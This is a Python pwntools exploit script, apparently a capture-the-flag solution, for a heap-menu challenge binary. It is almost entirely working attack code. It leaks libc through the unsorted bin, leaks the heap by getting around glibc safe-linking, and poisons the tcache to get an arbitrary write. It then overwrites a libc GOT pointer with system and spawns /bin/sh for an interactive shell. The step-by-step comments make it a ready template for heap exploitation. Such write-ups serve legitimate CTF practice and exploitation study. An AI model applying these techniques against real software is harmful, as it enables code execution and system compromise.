import pwn
from pwn import *

context.binary = "chall_patched"
context.log_level = 'DEBUG'

elf = ELF("./chall_patched")
p = elf.process()
libc = ELF("./libc.so.6")
ld = ELF("./ld.so")

def add(idx,size,fname,mname,lname,age,bio):
 p.recvuntil(b"user\n")
 p.sendline(b"1")
 p.sendlineafter(b"index: \n",idx)
 p.sendlineafter(b"minimum): \n",size)
 p.sendafter(b"firstname: \n",fname)
 p.sendafter(b"middlename: \n",mname)
 p.sendafter(b"lastname: \n",lname)
 p.sendlineafter(b"age: \n",age)
 p.sendafter(b"bio: \n",bio)

def show(idx):
 p.recvuntil(b"user\n")
 p.sendline(b"2")
 p.sendlineafter(b"index: \n",idx)

def delete(idx):
 p.recvuntil(b"user\n")
 p.sendline(b"3")
 p.sendlineafter(b"index: ",idx)

def edit(idx,fname,mname,lname,age,bio):
 p.recvuntil(b"user")
 p.sendline(b"4")
 p.sendlineafter(b"index: ",idx)
 p.sendafter(b"firstname: \n",fname)
 p.sendafter(b"middlename: \n",mname)
 p.sendafter(b"lastname: \n",lname)
 p.sendlineafter(b"age: \n",age)
 p.sendafter(b"1016)\n",bio)

def reage(idx,age):
 p.recvuntil(b"user")
 p.sendline(b"5")
 p.sendlineafter(b"Index: ",idx)
 p.sendlineafter(b"age: ",str(age))

add(b"0",b"1048",b"AAAA",b"AAAA",b"AAAA",b"90",b"A"*8) #we also cannot allocate chunks lesser than size 1032, we allocate three same sized chunks in order to get a libc leak by leaking the link pointers to main arena that will be set when an chunk goes into unsorted bin
add(b"1",b"1048",b"AAAA",b"AAAA",b"AAAA",b"90",b"B"*8)
add(b"2",b"1048",b"AAAA",b"AAAA",b"AAAA",b"90",b"C"*8)

delete(b"0") # we keep an extra chunk to prevent consolidation with top chunk
delete(b"1") # we delete the first two chunks now they are consolidated and is  in unsorted bin 

add(b"0",b"1112",b"AAAA",b"AAAA",b"AAAA",b"90",b"A"*8) #we  allocate an chunk that is greater in size compared to the original chunk by 64  this causes main arena pointers to be written in the other free chunk thats still there and it is now stored in chunk[1]'s bio part so we can leak it using show
delete(b"0")#we delete it again and it goes again into unsorted bin

add(b"0",b"1048",b"AAAA",b"AAAA",b"AAAA",b"90",b"A"*8)#we allocate the two chunks again but this time the libc main arena address is there in the first chunk 
add(b"1",b"1048",b"AAAA",b"AAAA",b"AAAA",b"90",b"B"*8)# it can be leaked via bio using show function
show(b"1")
p.recvuntil(b"BBBBBBBB")
libc_leak = u64(p.recv(6).strip().ljust(8,b"\x00"))# we get the leak and calculate libc base address
libc_puts = libc_leak - 0x156210
libc_base = libc_puts - libc.sym["puts"]
log.info("libc_leak: {}".format(hex(libc_leak)))
log.info("libc_puts: {}".format(hex(libc_puts)))
log.info("libc_base: {}".format(hex(libc_base)))
#pwn.gdb.attach(p,'''
#brva *40155F
#''')

delete(b"2")# we reset the heap to its initial state in order to next get the heap leak
delete(b"1")
delete(b"0")

add(b"0",b"1048",b"AAAA",b"AAAA",b"AAAA",b"90",b"A"*8)# we allocate two chunks in which one is an tcache sized chunk and another bigger chunk
add(b"1",b"1032",b"AAAA",b"AAAA",b"AAAA",b"90",b"B"*8) 
delete(b"1") # we delete the tcache and it ends up in tcache and has a link pointer 


overwrite = b"A"*984 #we fill up random bytes until the starting of the link so that we can make it point to null and we can use that to defeat safe linking as safe linking's protection is like this [safe pointer] = address >> 12 ^ address of link
overwrite += b"D"*8 # so now that the link is null we can easily defeat safe linking as the >> 12 is fixed and we can << 12 that easily 
edit(b"0",b"AAAA",b"AAAA",b"AAAA",b"90",overwrite)

show(b"0")
p.recvuntil(b"DDDDDDDD")
heap_leak = u64(p.recv(2).strip().ljust(8,b"\x00")) # we leak the heap and calculate the base as the heap is 4bytes here we get the correct base  after << 12 the received leak
heap_base = heap_leak << 12 # we reverse the safe linking and get heap_base
log.info("heap_leak: {}".format(hex(heap_leak)))
log.info("heap_base: {}".format(hex(heap_base)))
#pwn.gdb.attach(p,'''
#brva *401646
#''')

payload = b"A"*984
payload += p64(0x411)
edit(b"0",b"AAAA",b"AAAA",b"AAAA",b"90",payload)

#pwn.gdb.attach(p,'''
#brva *401646
#''')

add(b"1",b"1032",b"AAAA",b"AAAA",b"AAAA",b"90",b"B"*8) #now we do tcache poisoning and get a way to spawn a shell, in order to do that we allocate two tcache sized chunks first
add(b"2",b"1032",b"AAAA",b"AAAA",b"AAAA",b"90",b"B"*8)
delete(b"2")# we delete the chunks in this order so that the first chunk points to the second one 
delete(b"1")

payload = b"A"*984 #we fill up random bytes until the  beginning of the link
payload += p64(0x411)
payload += p64(((heap_base + 0x6c0) >> 12) ^ 0x4040C0) # we calcuate the current chunks heap address from base and then we do the safe linking process ourselves and make it point to the bss address of the persons list
edit(b"0",b"AAAA",b"AAAA",b"AAAA",b"90",payload) #we do that in order to get a arbitrary write,next so we can overwrite a pointer in the got table with system and pass /bin/sh to pop a shell
#pwn.gdb.attach(p,'''
#brva *401646
#''')

add(b"1",b"1032",b"AAAA",b"AAAA",b"AAAA",b"90",b"B"*8) # we add back the chunks 
add(b"2",b"1032",p64(libc_base+0x1c7080),p64(0x408),b"AAAA",b"90",b"B"*8) #due to the abscense of malloc hook and free hook we use the strlen_sse2@got pointer and calculate it from base
add(b"7",b"1048",b"/bin/sh\x00",b"AAAA",b"AAAA",b"90",b"B"*8) # we allocate a chunk with /bin/sh\x00 as firstname so that we can use it to pop a shell later in the process

reage(b"0",libc_base+libc.sym['system']) #we overwrite system using the re-age function after we calculate it from base we can also use edit to do it but this is much better 
p.sendline(b"2") # we use show to show the info of the chunk that has /bin/sh and we get a shell
p.sendline(b"7")

p.interactive()
